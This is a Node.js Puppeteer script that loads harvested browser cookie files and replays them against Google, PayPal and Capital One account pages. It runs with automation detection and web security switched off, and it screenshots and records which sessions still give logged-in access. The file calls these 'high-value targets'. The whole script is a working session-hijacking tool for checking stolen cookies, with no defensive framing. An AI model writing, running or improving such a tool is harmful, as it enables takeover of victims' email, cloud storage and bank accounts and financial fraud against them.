#!/usr/bin/env node

const fs = require("fs");
const path = require("path");
const puppeteer = require("puppeteer");
const readline = require("readline");

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

function ask(question) {
  return new Promise(resolve => {
    rl.question(question, resolve);
  });
}

async function validateSessions() {
  console.log("🚀 SESSION VALIDATOR - Real Browser Testing");
  console.log("===========================================");
  console.log("");

  const preparedDir = path.join(__dirname, "prepared_cookies");
  const screenshotDir = path.join(__dirname, "screenshots");
  const validatedDir = path.join(__dirname, "validated_sessions");

  // Ensure directories exist
  fs.mkdirSync(screenshotDir, { recursive: true });
  fs.mkdirSync(validatedDir, { recursive: true });

  // High-value targets from our analysis
  const targets = [
    {
      name: "Google Accounts",
      domain: "accounts.google.com",
      cookieFile: "accounts.google.com.txt",
      testUrls: [
        "https://myaccount.google.com/",
        "https://mail.google.com/",
        "https://drive.google.com/",
        "https://photos.google.com/"
      ]
    },
    {
      name: "PayPal",
      domain: "paypal.com",
      cookieFile: "paypal.com.txt",
      testUrls: [
        "https://www.paypal.com/myaccount/",
        "https://www.paypal.com/myaccount/summary/",
        "https://www.paypal.com/myaccount/transfer/"
      ]
    },
    {
      name: "Capital One",
      domain: "capitalone.com",
      cookieFile: "capitalone.com.txt",
      testUrls: [
        "https://myaccounts.capitalone.com/",
        "https://myaccounts.capitalone.com/ease/dashboard"
      ]
    }
  ];

  console.log("🎯 Target Sessions for Validation:");
  targets.forEach((target, i) => {
    console.log(`   ${i+1}. ${target.name} (${target.domain})`);
  });

  const choice = await ask("\nSelect session to validate (1-3) or \"all\": ");

  let selectedTargets = [];
  if (choice === "all") {
    selectedTargets = targets;
  } else {
    const index = parseInt(choice) - 1;
    if (index >= 0 && index < targets.length) {
      selectedTargets = [targets[index]];
    } else {
      console.log("Invalid choice");
      rl.close();
      return;
    }
  }

  const results = [];

  try {
    for (const target of selectedTargets) {
      console.log(`\n📋 Testing: ${target.name}`);
      console.log("═".repeat(50));

      const cookieFilePath = path.join(preparedDir, target.cookieFile);

      if (!fs.existsSync(cookieFilePath)) {
        console.log(`❌ Cookie file not found: ${target.cookieFile}`);
        continue;
      }

      // Load cookies once for this target
      console.log("  🔄 Loading cookies...");
      const content = fs.readFileSync(cookieFilePath, "utf-8");
      const cookieLines = content.split("\n")
        .filter(line => line.trim() && !line.startsWith("#"));

      const cookies = [];
      for (const line of cookieLines) {
        try {
          const parts = line.split("\t");
          if (parts.length >= 7) {
            const cookie = {
              name: parts[5]?.trim(),
              value: parts[6]?.trim(),
              domain: parts[0]?.trim(),
              path: parts[2]?.trim() || "/",
              httpOnly: parts[1] === "TRUE",
              secure: parts[3] === "TRUE"
            };

            if (cookie.name && cookie.value && cookie.domain) {
              cookies.push(cookie);
            }
          }
        } catch (_) {
          // Skip malformed cookies
        }
      }

      console.log(`  🍪 Loaded ${cookies.length} valid cookies`);

      if (cookies.length === 0) {
        console.log("  ❌ No valid cookies found");
        continue;
      }

      // Test each URL for this target with FRESH browser each time
      for (let i = 0; i < target.testUrls.length; i++) {
        const testUrl = target.testUrls[i];
        console.log(`\n  🌐 [${i+1}/${target.testUrls.length}] Testing: ${testUrl}`);
        console.log("      🔄 Opening fresh browser instance...");

        let browser = null;
        try {
          // Launch completely fresh browser for each URL test
          browser = await puppeteer.launch({
            headless: false,  // Visible browser
            slowMo: 100,      // Slow down for visibility
            defaultViewport: null,
            args: [
              "--start-maximized",
              "--no-sandbox",
              "--disable-setuid-sandbox",
              "--disable-web-security",
              "--disable-blink-features=AutomationControlled",
              "--disable-extensions",
              "--no-first-run",
              "--disable-default-apps",
              "--user-data-dir=" + `/tmp/chrome_session_${Date.now()}_${Math.random()}`
            ]
          });

          const pages = await browser.pages();
          const page = pages[0];

          // Set cookies with T-1 timing
          console.log(`      🍪 Setting ${cookies.length} cookies in fresh browser...`);
          await page.setCookie(...cookies);
          await new Promise(resolve => setTimeout(resolve, 2000));

          // Navigate to target
          console.log("      ⏳ Navigating to target...");
          await page.goto(testUrl, {
            waitUntil: "networkidle2",
            timeout: 30000
          });

          await new Promise(resolve => setTimeout(resolve, 3000));

          const title = await page.title();
          const url = page.url();
          const html = await page.content();

          console.log(`      📝 Title: ${title.substring(0, 60)}...`);
          console.log(`      🌐 Final URL: ${url.substring(0, 60)}...`);

          // Take screenshot
          const screenshotName = `${target.domain}_${i+1}_${Date.now()}.png`;
          const screenshotPath = path.join(screenshotDir, screenshotName);
          await page.screenshot({
            path: screenshotPath,
            fullPage: false,
            type: "png"
          });
          console.log(`      📸 Screenshot: ${screenshotName}`);

          // Automated analysis
          const loggedInIndicators = [
            "dashboard", "account", "profile", "logout", "sign out",
            "welcome", "my account", "settings", "balance", "summary",
            "messages", "notifications", "transactions"
          ];

          const loginIndicators = [
            "sign in", "log in", "login", "password", "username",
            "forgot password", "create account", "register", "blocked",
            "access denied", "verification required"
          ];

          const htmlLower = html.toLowerCase();
          const titleLower = title.toLowerCase();

          let loggedInScore = 0;
          let loginScore = 0;

          loggedInIndicators.forEach(indicator => {
            if (htmlLower.includes(indicator) || titleLower.includes(indicator)) {
              loggedInScore++;
            }
          });

          loginIndicators.forEach(indicator => {
            if (htmlLower.includes(indicator) || titleLower.includes(indicator)) {
              loginScore++;
            }
          });

          const confidence = Math.round((loggedInScore / (loggedInScore + loginScore + 0.1)) * 100);

          // Check for blocking/security messages
          const blockingIndicators = ["blocked", "access denied", "verification required", "suspicious activity"];
          let isBlocked = false;
          blockingIndicators.forEach(indicator => {
            if (htmlLower.includes(indicator) || titleLower.includes(indicator)) {
              isBlocked = true;
            }
          });

          console.log(`      📊 Auto Analysis: ${confidence}% confidence`);
          console.log(`         - Logged-in signals: ${loggedInScore}`);
          console.log(`         - Login/blocked signals: ${loginScore}`);

          if (isBlocked) {
            console.log("      🚫 WARNING: Potential blocking detected");
          }

          // Manual verification
          console.log("\n      👤 MANUAL VERIFICATION:");
          console.log("         🌐 Check the browser window (should be visible)");
          console.log(`         📸 Screenshot: ${screenshotPath}`);
          console.log("         🔍 Look for: personal info, account details, logout button");

          if (isBlocked) {
            console.log("         ⚠️  Potential blocking/security challenge detected");
          }

          const verification = await ask("      ❓ Is this showing a logged-in session? (y/n/blocked): ");

          let manualResult = "UNKNOWN";
          if (verification.toLowerCase().startsWith("y")) {
            manualResult = "LOGGED_IN";
            console.log("      ✅ CONFIRMED: Logged in session");
          } else if (verification.toLowerCase().startsWith("blocked") || verification.toLowerCase().startsWith("b")) {
            manualResult = "BLOCKED";
            console.log("      🚫 CONFIRMED: Blocked/Security challenge");
          } else if (verification.toLowerCase().startsWith("n")) {
            manualResult = "NOT_LOGGED_IN";
            console.log("      ❌ CONFIRMED: Not logged in");
          } else {
            manualResult = "UNSURE";
            console.log("      🤔 UNSURE: Needs further investigation");
          }

          const result = {
            target: target.name,
            domain: target.domain,
            testUrl,
            finalUrl: url,
            title: title.substring(0, 100),
            cookieCount: cookies.length,
            autoConfidence: confidence,
            loggedInScore,
            loginScore,
            manualResult,
            isBlocked,
            screenshotPath,
            timestamp: new Date().toISOString(),
            browserSession: "FRESH"
          };

          results.push(result);

        } catch (error) {
          console.error(`      ❌ Error testing ${testUrl}: ${error.message}`);
          results.push({
            target: target.name,
            domain: target.domain,
            testUrl,
            error: error.message,
            timestamp: new Date().toISOString(),
            browserSession: "FRESH"
          });
        } finally {
          // ALWAYS close the fresh browser instance
          if (browser) {
            console.log("      🔄 Closing fresh browser instance...");
            await browser.close();
          }
        }

        // Wait before next fresh browser launch
        console.log("      ⏳ Waiting 3 seconds before next test...");
        await new Promise(resolve => setTimeout(resolve, 3000));
      }
    }
  } finally {
    // No browser to close here since each test uses its own fresh browser
    console.log("\n🧹 All fresh browser instances have been closed");
  }

  // Save results
  const resultsPath = path.join(validatedDir, `validation_results_${Date.now()}.json`);
  fs.writeFileSync(resultsPath, JSON.stringify(results, null, 2));

  console.log("\n🎉 VALIDATION COMPLETE!");
  console.log("=======================");

  const loggedIn = results.filter(r => r.manualResult === "LOGGED_IN");
  const notLoggedIn = results.filter(r => r.manualResult === "NOT_LOGGED_IN");
  const unsure = results.filter(r => r.manualResult === "UNSURE");
  const errors = results.filter(r => r.error);

  console.log("📊 Manual Validation Summary:");
  console.log(`   ✅ Confirmed logged in: ${loggedIn.length}`);
  console.log(`   ❌ Confirmed not logged in: ${notLoggedIn.length}`);
  console.log(`   🤔 Unsure: ${unsure.length}`);
  console.log(`   💥 Errors: ${errors.length}`);
  console.log(`   📁 Results saved: ${resultsPath}`);
  console.log(`   📸 Screenshots in: ${screenshotDir}`);

  if (loggedIn.length > 0) {
    console.log("\n✅ CONFIRMED WORKING SESSIONS:");
    loggedIn.forEach(result => {
      console.log(`   • ${result.target} - ${result.testUrl}`);
    });
  }

  rl.close();
}

validateSessions().catch(error => {
  console.error("💥 Fatal error:", error.message);
  rl.close();
  process.exit(1);
});
